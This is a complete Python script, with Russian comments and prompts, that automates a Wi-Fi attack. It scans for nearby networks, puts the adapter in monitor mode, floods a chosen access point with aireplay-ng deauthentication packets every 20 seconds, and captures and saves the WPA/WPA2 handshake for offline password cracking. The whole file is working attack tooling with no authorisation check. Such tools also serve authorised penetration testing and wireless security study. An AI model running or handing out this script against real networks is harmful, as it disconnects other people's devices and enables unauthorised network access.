#!/usr/bin/env python3
"""
Захват WPA/WPA2 handshake через airodump-ng + aireplay-ng.
Требует: root, iw, airodump-ng, aireplay-ng, aircrack-ng.
Интерфейс должен быть в режиме monitor (скрипт переводит сам).
"""

import os
import sys
import time
import signal
import subprocess
import re
import threading
from pathlib import Path
import shutil
import tempfile     

# ============ Утилиты ============

def check_root():
    if os.geteuid() != 0:
        print("[-] Запустите с sudo.")
        sys.exit(1)


def check_tools():
    missing = []
    for tool in ("iw", "airodump-ng", "aireplay-ng", "aircrack-ng", "ip"):
        if subprocess.run(["which", tool], capture_output=True).returncode != 0:
            missing.append(tool)
    if missing:
        print(f"[-] Не найдены утилиты: {', '.join(missing)}")
        sys.exit(1)


def run(cmd):
    return subprocess.run(cmd, capture_output=True, text=True)


def get_interface_mode(interface):
    r = run(["iw", "dev", interface, "info"])
    m = re.search(r"type\s+(\w+)", r.stdout)
    return m.group(1) if m else "unknown"


def set_interface_mode(interface, mode):
    subprocess.run(["ip", "link", "set", interface, "down"], check=True)
    subprocess.run(["iw", "dev", interface, "set", "type", mode], check=True)
    subprocess.run(["ip", "link", "set", interface, "up"], check=True)


def ensure_monitor(interface):
    if get_interface_mode(interface).lower() == "monitor":
        print(f"[+] {interface} уже в режиме monitor.")
        return True
    print(f"[*] Перевод {interface} в monitor")
    try:
        set_interface_mode(interface, "monitor")
        print("[+] Готово.")
        return True
    except subprocess.CalledProcessError as e:
        print(f"[-] Не удалось переключить режим: {e}")
        return False


def restore_managed(interface):
    try:
        if get_interface_mode(interface).lower() == "monitor":
            print(f"[*] Возвращаю {interface} в managed...")
            set_interface_mode(interface, "managed")
    except Exception:
        pass



# ============ Сканирование ============

def parse_airodump_csv(csv_path):
    """Парсит CSV от airodump-ng. Устойчив к ведущим пробелам в заголовке."""
    networks = []
    if not os.path.exists(csv_path):
        return networks
    try:
        with open(csv_path, 'r', encoding='utf-8', errors='ignore') as f:
            lines = f.readlines()
    except Exception:
        return networks

    # Пропускаем возможные пустые строки в начале файла
    start = 0
    while start < len(lines) and not lines[start].strip():
        start += 1
    if start >= len(lines):
        return networks

    # Секция AP идёт до пустой строки или строки 'Station MAC'
    ap_lines = []
    for line in lines[start:]:
        s = line.rstrip('\n').rstrip('\r')
        if not s.strip() or s.startswith('Station MAC'):
            break
        ap_lines.append(s)

    if len(ap_lines) < 2:      # только заголовок, данных ещё нет
        return networks

    # Парсим вручную: в CSV заголовки идут как ' channel', ' ESSID' и т.п.
    header = [h.strip() for h in ap_lines[0].split(',')]
    col = {name.lower(): i for i, name in enumerate(header)}
    if 'bssid' not in col:
        return networks

    max_idx = max(col.get(n, 0) for n in
                  ('bssid', 'channel', 'privacy', 'cipher',
                   'authentication', 'power', 'essid'))

    bssid_re = re.compile(r'^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$')

    for line in ap_lines[1:]:
        parts = line.split(',')
        if len(parts) <= max_idx:
            continue

        def get(name):
            i = col.get(name)
            return parts[i].strip() if i is not None and i < len(parts) else ''

        bssid = get('bssid')
        if not bssid_re.match(bssid):
            continue

        networks.append({
            'bssid':   bssid,
            'channel': get('channel'),
            'essid':   get('essid'),
            'privacy': get('privacy'),
            'cipher':  get('cipher'),
            'auth':    get('authentication'),
            'power':   get('power'),
        })
    return networks


def display_networks(networks):
    if not networks:
        print("[-] Сети не найдены.")
        return
    print("\n{:<4} {:<20} {:<4} {:<6} {:<30} {:<12}".format(
        "№", "BSSID", "Ch", "PWR", "ESSID", "Шифрование"
    ))
    print("-" * 90)
    for i, net in enumerate(networks, 1):
        essid = net['essid'] if net['essid'] else '<скрытая>'
        privacy = net['privacy'] if net['privacy'] else 'Open'
        print("{:<4} {:<20} {:<4} {:<6} {:<30} {:<12}".format(
            i, net['bssid'], net['channel'], net['power'], essid[:28], privacy
        ))


def ask_scan_duration():
    print("\nВремя сканирования:")
    print("  Enter или 0 — бесконечно (Ctrl+C для остановки) [по умолчанию]")
    print("  Или число секунд")
    value = input()
    if value == "":
        return None
    try:
        n = int(value)
        return None if n <= 0 else n
    except ValueError:
        print("[-] Некорректно. Использую бесконечный режим.")
        return None

def find_terminal():
    """Ищет доступный эмулятор терминала. Возвращает (имя, базовую команду)."""
    candidates = [
        ("xterm",          ["xterm", "-e"]),
        ("qterminal",      ["qterminal", "-e"]),
        ("xfce4-terminal", ["xfce4-terminal", "-e"]),
        ("gnome-terminal", ["gnome-terminal", "--"]),
        ("konsole",        ["konsole", "-e"]),
    
    ]
    for name, cmd in candidates:
        if shutil.which(name):
            return name, cmd
    return None, None

def scan_networks(interface, duration, work_dir):
    """
    Запускает airodump-ng (2.4 + 5 ГГц) в отдельном окне терминала,
    параллельно следит за CSV и показывает счётчик найденных сетей.
    Ctrl+C или истечение duration — останавливает сканирование.
    """
    work_dir = Path(work_dir)
    prefix = str(work_dir / "scan")
    csv_file = f"{prefix}-01.csv"

    airodump_cmd = (
        f'airodump-ng --band abg '
        f'--write "{prefix}" '
        f'--output-format csv --write-interval 1 '
        f'{interface}'
    )

    term_name, term_cmd = find_terminal()
    term_proc = None

    if term_name:
        script_path = work_dir / "scan.sh"
        script_path.write_text(
            "#!/bin/bash\n"
            "echo 'Сканирование 2.4 + 5 ГГц. Ctrl+C — остановить.'\n"
            "echo\n"
            f"{airodump_cmd}\n"
            "echo\n"
            "echo 'Сканирование завершено. Enter — закрыть окно.'\n"
            "read\n"
        )
        script_path.chmod(0o755)

        if term_name == "gnome-terminal":
            launch = term_cmd + ["bash", str(script_path)]
        else:
            # xterm, konsole, qterminal, xfce4-terminal — все хотят одну строку
            launch = term_cmd + [f"bash {script_path}"]

        try:
            term_proc = subprocess.Popen(launch, preexec_fn=os.setsid)
            print(f"[*] Сканирование открыто в отдельном окне ({term_name}).")
        except Exception as e:
            print(f"[!] Не удалось открыть {term_name}: {e}")
            term_proc = None

    if term_proc is None:
        # Fallback: тот же терминал, stdout в /dev/null
        print("[!] Терминал не найден, запускаю сканирование здесь же.")
        cmd = ["airodump-ng", "--band", "abg",
               "--write", prefix, "--output-format", "csv",
               "--write-interval", "1", interface]
        term_proc = subprocess.Popen(
            cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
        )

    if duration is None:
        print("[*] Бесконечное сканирование. Ctrl+C — остановить.\n")
    else:
        print(f"[*] Сканирование {duration} сек. Можно прервать Ctrl+C.\n")

    try:
        if duration is None:
            last = -1
            while True:
                # пользователь закрыл окно xterm — выходим
                if term_proc.poll() is not None:
                    print("\n[*] Окно сканирования закрыто. Останавливаю.")
                    break
                time.sleep(1)
                count = len(parse_airodump_csv(csv_file))
                if count != last:
                    print(f"\r[*] Найдено сетей: {count}", end='', flush=True)
                    last = count
        else:
            for remaining in range(duration, 0, -1):
                if term_proc.poll() is not None:
                    print("\n[*] Окно сканирования закрыто. Останавливаю.")
                    break
                time.sleep(1)
                count = len(parse_airodump_csv(csv_file))
                print(f"\r[*] Осталось: {remaining:3d} сек | Сетей: {count}",
                      end='', flush=True)
            print()
    except KeyboardInterrupt:
        print("\n[*] Сканирование остановлено пользователем.")
    finally:
        # Даём airodump-ng дописать CSV, если он ещё жив
        if term_proc.poll() is None:
            try:
                os.killpg(os.getpgid(term_proc.pid), signal.SIGINT)
                try:
                    term_proc.wait(timeout=3)
                except subprocess.TimeoutExpired:
                    os.killpg(os.getpgid(term_proc.pid), signal.SIGKILL)
            except (ProcessLookupError, PermissionError):
                pass
        time.sleep(1)   # пауза, чтобы CSV успел зафлашиться на диск

    networks = parse_airodump_csv(csv_file)
    print(f"[+] Итого найдено сетей: {len(networks)}")
    return networks


# ============ Проверка handshake ============

def check_handshake(cap_file):
    if not os.path.exists(cap_file) or os.path.getsize(cap_file) == 0:
        return False
    try:
        r = subprocess.run(
            ["aircrack-ng", cap_file],
            capture_output=True, text=True, timeout=30
        )
        out = r.stdout + r.stderr
        if re.search(r"\b1 handshake\b", out, re.IGNORECASE):
            return True
        if "WPA handshake" in out:
            return True
    except Exception:
        pass
    return False


# ============ Захват handshake ============

def _build_capture_script(work_dir, interface, target):
    """Готовит bash-скрипт для окна airodump-ng при захвате handshake."""
    bssid = target['bssid']
    channel = target['channel']
    prefix = str(Path(work_dir) / f"capture_{bssid.replace(':', '')}")
    cap_file = f"{prefix}-01.cap"

    cmd = (
        f'airodump-ng --bssid {bssid} --channel {channel} '
        f'--write "{prefix}" --output-format pcap '
        f'{interface}'
    )

    script_path = Path(work_dir) / "capture.sh"
    script_path.write_text(
        "#!/bin/bash\n"
        f"echo '=== Захват handshake: {target['essid'] or '<скрытая>'} ({bssid}), канал {channel} ==='\n"
        "echo 'Ctrl+C — остановить захват.'\n"
        "echo\n"
        f"{cmd}\n"
        "echo\n"
        "echo 'Захват завершён. Enter — закрыть окно.'\n"
        "read\n"
    )
    script_path.chmod(0o755)
    return script_path, cap_file


def _build_deauth_script(work_dir, interface, target, count=10):
    """Готовит bash-скрипт для окна aireplay-ng --deauth."""
    bssid = target['bssid']

    script_path = Path(work_dir) / "deauth.sh"
    script_path.write_text(
        "#!/bin/bash\n"
        f"echo '=== Деаутентификация: {bssid} ==='\n"
        f"echo 'Пакетов за раз: {count}, повтор каждые 20 сек.'\n"
        "echo 'Ctrl+C — остановить.'\n"
        "echo\n"
        "while true; do\n"
        f"    aireplay-ng --deauth {count} -a {bssid} {interface}\n"
        "    echo '--- пауза 20 сек ---'\n"
        "    sleep 20\n"
        "done\n"
    )
    script_path.chmod(0o755)
    return script_path


def _launch_in_terminal(term_name, term_cmd, script_path):
    """Запускает bash-скрипт в отдельном окне терминала. Возвращает Popen или None."""
    if term_name == "gnome-terminal":
        launch = term_cmd + ["bash", str(script_path)]
    else:
        launch = term_cmd + [f"bash {script_path}"]
    try:
        return subprocess.Popen(launch, preexec_fn=os.setsid)
    except Exception as e:
        print(f"[!] Не удалось открыть {term_name}: {e}")
        return None


def _kill_group(proc):
    """Корректно гасит группу процессов (терминал + его дети)."""
    if proc is None or proc.poll() is not None:
        return
    try:
        os.killpg(os.getpgid(proc.pid), signal.SIGINT)
        try:
            proc.wait(timeout=3)
        except subprocess.TimeoutExpired:
            os.killpg(os.getpgid(proc.pid), signal.SIGKILL)
    except (ProcessLookupError, PermissionError):
        pass

def _cap_file_stale(cap_file, threshold=15):
    """True, если .cap не обновлялся дольше threshold секунд."""
    if not os.path.exists(cap_file):
        return True
    return (time.time() - os.path.getmtime(cap_file)) > threshold



def _revive_watchdog(interface, cap_file, stop_event,
                     check_interval=5, stale_threshold=15, cooldown=20):
    """
    Следит за mtime .cap-файла. Если файл не обновляется stale_threshold
    секунд — значит airodump-ng завис, гоняем airodump-ng <iface> 8 сек.
    """
    last_revive = 0
    while not stop_event.is_set():
        time.sleep(check_interval)
        if stop_event.is_set():
            break

        if not _cap_file_stale(cap_file, stale_threshold):
            continue

        if time.time() - last_revive < cooldown:
            continue

        print(f"\n[!] .cap не обновляется >{stale_threshold} сек — оживляю драйвер.")

        # Гоняем airodump-ng БЕЗ --bssid/--channel, чтобы драйвер переинициализировался
        revive = subprocess.Popen(
            ["airodump-ng", interface],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
            preexec_fn=os.setsid
        )
        try:
            # 8 секунд — обычно хватает, чтобы канал сбросился
            for _ in range(8):
                time.sleep(1)
                if stop_event.is_set():
                    break
        finally:
            try:
                os.killpg(os.getpgid(revive.pid), signal.SIGINT)
                try:
                    revive.wait(timeout=3)
                except subprocess.TimeoutExpired:
                    os.killpg(os.getpgid(revive.pid), signal.SIGKILL)
            except (ProcessLookupError, PermissionError):
                pass

        last_revive = time.time()
        print("[+] Оживление завершено, жду восстановления захвата.")


def capture_handshake(interface, target, work_dir, timeout=180, deauth=True):

    bssid = target['bssid']
    channel = target['channel']
    essid = target['essid'] or '<скрытая>'

    if not channel.isdigit():
        print(f"[-] Некорректный канал: {channel!r}")
        return None

    # Фиксируем канал адаптера, чтобы оба окна работали на одном канале
    subprocess.run(["iw", "dev", interface, "set", "channel", channel],
                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    work_dir = Path(work_dir)
    cap_script, cap_file = _build_capture_script(work_dir, interface, target)

    term_name, term_cmd = find_terminal()
    if term_name is None:
        print("[!] Терминал не найден. Захват в этом окне, без графики.")
        # Fallback: airodump в фон, без окна
        prefix = str(work_dir / f"capture_{bssid.replace(':', '')}")
        airodump = subprocess.Popen(
            ["airodump-ng", "--bssid", bssid, "--channel", channel,
             "--write", prefix, "--output-format", "pcap", interface],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
        )
        cap_term = None
    else:
        cap_term = _launch_in_terminal(term_name, term_cmd, cap_script)
        airodump = cap_term  # для единообразия poll() ниже
        if cap_term is not None:
            print(f"[*] Захват открыт в отдельном окне ({term_name}).")

    # Окно с деаутентификацией
    deauth_term = None
    if deauth:
        deauth_script = _build_deauth_script(work_dir, interface, target, count=10)
        if term_name is not None:
            deauth_term = _launch_in_terminal(term_name, term_cmd, deauth_script)
            if deauth_term is not None:
                print(f"[*] Деаутентификация открыта во втором окне ({term_name}).")
        else:
            # Fallback: фоновый цикл без вывода
            def _deauth_loop():
                while True:
                    subprocess.run(
                        ["aireplay-ng", "--deauth", "10", "-a", bssid, interface],
                        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
                    )
                    time.sleep(20)
            threading.Thread(target=_deauth_loop, daemon=True).start()
            print("[*] Деаутентификация запущена в фоне (без вывода).")

    print(f"\n[*] Цель:   {essid} ({bssid}), канал {channel}")
    print(f"[*] Файл:   {cap_file}")
    print(f"[*] Таймаут: {timeout} сек (Ctrl+C — остановить)")


    stop_watchdog = threading.Event()
    watchdog = threading.Thread(
        target=_revive_watchdog,
        args=(interface, cap_file, stop_watchdog),   # ← передаём cap_file
        daemon=True
    )
    watchdog.start()
    print("[*] Watchdog запущен (следит за .cap).")

    start = time.time()
    found = False
    try:
        while time.time() - start < timeout:
            # оба окна закрыты — пользователь сам всё свернул
            cap_alive = cap_term is not None and cap_term.poll() is None
            deauth_alive = deauth_term is not None and deauth_term.poll() is None
            if cap_term is not None and not cap_alive and (
                deauth_term is None or not deauth_alive
            ):
                print("\n[*] Окна закрыты пользователем. Останавливаю.")
                break

            if os.path.exists(cap_file) and check_handshake(cap_file):
                found = True
                print("\n[+] Handshake найден!")
                break

            remaining = int(timeout - (time.time() - start))
            print(f"\r[*] Ожидание... {remaining:3d} сек", end='', flush=True)
            time.sleep(3)
    except KeyboardInterrupt:
        print("\n[*] Прервано.")
    finally:
        stop_watchdog.set()
        _kill_group(deauth_term)
        _kill_group(cap_term)
        if cap_term is None and airodump is not None and airodump.poll() is None:
            # fallback-режим без окна
            try:
                airodump.send_signal(signal.SIGINT)
                airodump.wait(timeout=5)
            except Exception:
                airodump.kill()
        time.sleep(1)

    print()
    if os.path.exists(cap_file):
        if found or check_handshake(cap_file):
            print(f"[+] Handshake сохранён: {cap_file}")
        else:
            print(f"[-] Handshake не найден. Файл: {cap_file}")
        return cap_file
    print("[-] Файл захвата не создан.")
    return None


# ============ Основной сценарий ============
def ask_save_path(cap_file):
    """
    Спрашивает, куда сохранить пойманный handshake.
    По умолчанию — текущая рабочая директория (откуда запущен main.py).
    Возвращает Path или None, если пользователь отменил.
    """
    default = Path.cwd() / Path(cap_file).name
    print(f"\n[+] Handshake пойман.")
    print(f"    По умолчанию: {default}")
    print("    Enter — сохранить по умолчанию, 'c' — отменить сохранение.")

    user = input("Путь: ").strip()

    if user.lower() == 'c':
        return None

    if user == "":
        target = default
    else:
        target = Path(user).expanduser()
        if target.is_dir():
            target = target / Path(cap_file).name

    # Создаём директорию, если её нет
    if not target.parent.exists():
        try:
            target.parent.mkdir(parents=True, exist_ok=True)
        except OSError as e:
            print(f"[-] Не удалось создать директорию: {e}")
            return None

    # Проверяем, не перезапишем ли файл
    if target.exists():
        ans = input(f"'{target}' уже существует. Перезаписать? (y/n): ").strip().lower()
        if ans != 'y':
            print("[*] Сохранение отменено.")
            return None

    return target

def handshake_flow(interface):
    # Всё пишем во временную папку. Если handshake не поймаем — она удалится.
    tmp_dir = Path(tempfile.mkdtemp(prefix="wifitool_"))

    try:
        duration = ask_scan_duration()

        networks = scan_networks(interface, duration, tmp_dir)
        if not networks:
            print("[-] Сети не найдены.")
            return

        display_networks(networks)

        # Выбор цели
        while True:
            try:
                choice = input("\nВыберите номер сети (0 — отмена): ").strip()
                if choice == '0':
                    return
                idx = int(choice) - 1
                if 0 <= idx < len(networks):
                    target = networks[idx]
                    break
                print(f"Ошибка: введите число от 1 до {len(networks)}.")
            except ValueError:
                print("Ошибка: нужно ввести целое число.")

        print(f"\n[*] Цель: {target['essid'] or '<скрытая>'} ({target['bssid']})")

        ans = input("Отправлять deauth? (Y/n): ").strip().lower()
        deauth = ans != 'n'

        try:
            timeout_str = input("Таймаут захвата в секундах (Enter = 180): ").strip()
            timeout = int(timeout_str) if timeout_str else 180
            if timeout <= 0:
                timeout = 180
        except ValueError:
            timeout = 180

        cap_file = capture_handshake(
            interface, target, tmp_dir, timeout=timeout, deauth=deauth
        )

        # Сохраняем только если handshake реально пойман
        if cap_file and os.path.exists(cap_file) and check_handshake(cap_file):
            save_path = ask_save_path(cap_file)
            if save_path:
                try:
                    shutil.move(cap_file, save_path)
                    print(f"\n[+] Handshake сохранён: {save_path}")
                except Exception as e:
                    print(f"[-] Не удалось сохранить: {e}")
            else:
                print("[*] Файл не сохранён.")
        else:
            print("\n[-] Handshake не пойман. Файлы не сохраняются.")

    finally:
        # Чистим временную папку (и scan-*, и capture-*, и scan.sh)
        try:
            shutil.rmtree(tmp_dir, ignore_errors=True)
        except Exception:
            pass


def main():
    check_root()
    check_tools()

    if len(sys.argv) > 1:
        interface = sys.argv[1]
    else:
        interface = input("Введите имя Wi-Fi интерфейса (например, wlan0): ").strip()

    if not interface:
        print("[-] Интерфейс не указан.")
        sys.exit(1)

    # Проверка, что интерфейс существует
    r = run(["iw", "dev", interface, "info"])
    if r.returncode != 0:
        print(f"[-] Интерфейс {interface} не найден.")
        sys.exit(1)

    try:
        if not ensure_monitor(interface):
            sys.exit(1)
        handshake_flow(interface)
    finally:
        restore_managed(interface)


if __name__ == '__main__':
    main()